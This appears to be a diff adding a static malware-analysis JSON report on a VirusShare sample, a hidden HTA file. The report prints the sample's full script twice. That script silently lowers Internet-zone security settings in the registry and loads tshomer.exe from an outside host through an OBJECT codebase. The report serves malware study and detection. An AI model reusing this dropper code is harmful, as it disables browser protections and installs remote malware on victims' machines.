@@ -1,0 +1,91 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "write": "May write to a file"
+        },
+        "macro": "<hta:application id=hta_note_id\n  applicationName=hta_note_name\n  showInTaskBar=no\n  caption=no\n  innerBorder=no\n  selection=no\n  scroll=no\n  contextmenu=no />\n   <script language=javascript>\n        window.resizeTo(0, 0);\n        window.moveTo(0, 0);\n </script>\n<script>\n\nfunction Writer(key)\n{\nvar WSHShell = new ActiveXObject(\"WScript.Shell\");\nbigkey = hotkey + \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\3\\\\\" + key;\nWSHShell.RegWrite(bigkey, value, \"REG_DWORD\");\n}\n\nfunction WriteReg(){\nvalue = 0x00000000;\nWriter('1001');\nWriter('1004');\nWriter('1201');\nWriter('1200');\nWriter('1405');\nWriter('1A02');\nWriter('1A03');\nWriter('1803');\nWriter('1604');\nWriter('1406');\nWriter('1802');\nWriter('1800');\nWriter('1804');\nWriter('1607');\nWriter('1606');\nWriter('1400');\nWriter('1407');\nWriter('1402');\nvalue = 0x00020000;\nWriter('1E05');\nWriter('1A00');\nvalue = 0x00000001;\nWriter('1601');\nvalue = 0x00010000;\nWriter('1C00');\n}\n\nfunction DoIt(){\nhotkey = 'HKCU';\nWriteReg();\nhotkey = 'HKLM';\nWriteReg();\ndocument.write('<OBJECT height=\"1\" width=\"1\"  CLASSID=\"CLSID:AD688740-5246-40C3-AF27-090006046834\" CODEBASE=\"http://v-nature.biz/e/tshomer/tshomer.exe#Version=-1,-1,-1,-1\" >')\n}\n\nDoIt();\n\n</script>"
+    },
+    "filename": "VirusShare_21b20bcc4a0c6690b58df62b86c19e8d",
+    "filesize": 1290,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "21b20bcc4a0c6690b58df62b86c19e8d",
+        "sha1": "01554b5f7b9fa0e5dee234b3b2574fe18c7ebfeb",
+        "sha256": "6f3ea3513364ac50de1da707f4043a20e21225bd3abfd769b3e6ebcecf7e8b56"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<hta:application id=hta_note_id",
+            "  applicationName=hta_note_name",
+            "  showInTaskBar=no",
+            "  caption=no",
+            "  innerBorder=no",
+            "  selection=no",
+            "  scroll=no",
+            "  contextmenu=no />",
+            "   <script language=javascript>",
+            "        window.resizeTo(0, 0);",
+            "        window.moveTo(0, 0);",
+            " </script>",
+            "<script>",
+            "function Writer(key)",
+            "var WSHShell = new ActiveXObject(\"WScript.Shell\");",
+            "bigkey = hotkey + \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\3\\\\\" + key;",
+            "WSHShell.RegWrite(bigkey, value, \"REG_DWORD\");",
+            "function WriteReg(){",
+            "value = 0x00000000;",
+            "Writer('1001');",
+            "Writer('1004');",
+            "Writer('1201');",
+            "Writer('1200');",
+            "Writer('1405');",
+            "Writer('1A02');",
+            "Writer('1A03');",
+            "Writer('1803');",
+            "Writer('1604');",
+            "Writer('1406');",
+            "Writer('1802');",
+            "Writer('1800');",
+            "Writer('1804');",
+            "Writer('1607');",
+            "Writer('1606');",
+            "Writer('1400');",
+            "Writer('1407');",
+            "Writer('1402');",
+            "value = 0x00020000;",
+            "Writer('1E05');",
+            "Writer('1A00');",
+            "value = 0x00000001;",
+            "Writer('1601');",
+            "value = 0x00010000;",
+            "Writer('1C00');",
+            "function DoIt(){",
+            "hotkey = 'HKCU';",
+            "WriteReg();",
+            "hotkey = 'HKLM';",
+            "WriteReg();",
+            "document.write('<OBJECT height=\"1\" width=\"1\"  CLASSID=\"CLSID:AD688740-5246-40C3-AF27-090006046834\" CODEBASE=\"http://v-nature.biz/e/tshomer/tshomer.exe#Version=-1,-1,-1,-1\" >')",
+            "DoIt();",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://v-nature.biz/e/tshomer/tshomer.exe#Version=-1-1-1-1"
+        ]
+    },
+    "time": "0:00:00.293490",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
